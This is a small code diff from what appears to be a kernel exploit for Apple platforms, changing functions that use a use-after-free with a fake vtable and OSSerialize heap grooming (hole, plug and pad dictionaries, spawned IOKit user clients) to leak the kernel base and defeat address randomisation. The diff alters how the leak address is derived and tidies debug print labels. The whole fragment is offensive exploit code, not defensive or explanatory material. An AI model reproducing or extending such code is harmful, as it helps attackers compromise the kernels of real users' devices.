@@ -111,7 +111,8 @@ void uaf_with_vtab(addr_t addr)
 
 void uaf_panic_leak_DATA_const_base(void)
 {
-    uaf_with_vtab(KERNEL_BASE + get_kernel_slide() + 0x244);
+    // Unsafe version of get_kernel_slide
+    uaf_with_vtab((get_kernel_anchor() & 0xfff00000) + 0x1244);
 }
 
 void uaf_panic_leak_vtab(void)
@@ -179,10 +180,10 @@ void uaf_panic_leak_vtab(void)
             dict_pad[2 + i * 4 + 2] |= kOSSerializeEndCollection;
         }
     }
-    PRINT_BUF("dict     ", dict,      sizeof(dict));
+    PRINT_BUF("dict"     , dict,      sizeof(dict));
     PRINT_BUF("dict_hole", dict_hole, sizeof(dict));
     PRINT_BUF("dict_plug", dict_plug, sizeof(dict));
-    PRINT_BUF("dict_pad ", dict_pad,  sizeof(dict));
+    PRINT_BUF("dict_pad" , dict_pad,  sizeof(dict));
 
     DEBUG("Spawning user clients...");
     io_connect_t client_plug,
